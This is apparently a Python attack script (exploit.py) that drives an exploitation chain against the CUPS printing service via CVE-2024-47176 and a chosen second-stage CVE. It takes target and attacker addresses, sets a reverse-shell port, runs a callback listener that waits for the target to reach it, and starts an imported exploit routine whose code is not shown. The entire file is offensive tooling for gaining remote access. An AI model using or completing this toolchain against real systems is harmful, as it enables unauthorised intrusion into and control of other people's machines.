# The 2xdropout 2024

import argparse
import threading
import socket
import CVE_2024_47176


def listen(port):
    pass


def server(port, printerName):
    print("[SERVER] Starting")
    host = "0.0.0.0"

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, int(port)))
    server_socket.listen(1)

    isVulnerable = False

    while not isVulnerable:    
        client_connection, client_address = server_socket.accept()

        request = client_connection.recv(1024).decode()
        if(request != None):
            print("[SERVER] Request Recieved")
        isVulnerable = CVE_2024_47176.verify(request, printerName)


parser = argparse.ArgumentParser(
                    prog='exploit.py',
                    description='Autoexploitation and attack toolchain for CUPS CVE-2024-47176',
                    epilog='Written with love by 2xdropout')


parser.add_argument('RHOST', help = 'Target IP')
parser.add_argument('LHOST', help = 'Attacker IP')
parser.add_argument('--LPORT', default = 4444, help = 'Attacker reverseshell port | Default:4444')
parser.add_argument('--RPORT', default = 631, help = 'Target Port | Default:631')
parser.add_argument('--SVRPORT', default = 8080, help = 'Attacker Server Port | Default:8080')
parser.add_argument('--printer', default = 'The2xdropout', help = 'Set printer name | Default:The2xdropout')
parser.add_argument('--CVE', default = 1, help = "Select the second stage in the attack chain -> [1:CVE-2024-47076, 2:CVE-2024-47175, 3:CVE-2024-47177] | Default:1")
parser.add_argument('-T', '--timeout', default = 480, help = "The timeout value to wait for a target response | Default:480")

args = parser.parse_args()

serverThread = threading.Thread(target = server, args = (args.SVRPORT, args.printer))
CVE_2024_47176Thread = threading.Thread(target = CVE_2024_47176.initiate, args = (args.RHOST, args.RPORT, args.LHOST, args.SVRPORT, args.printer))

serverThread.start()
CVE_2024_47176Thread.start()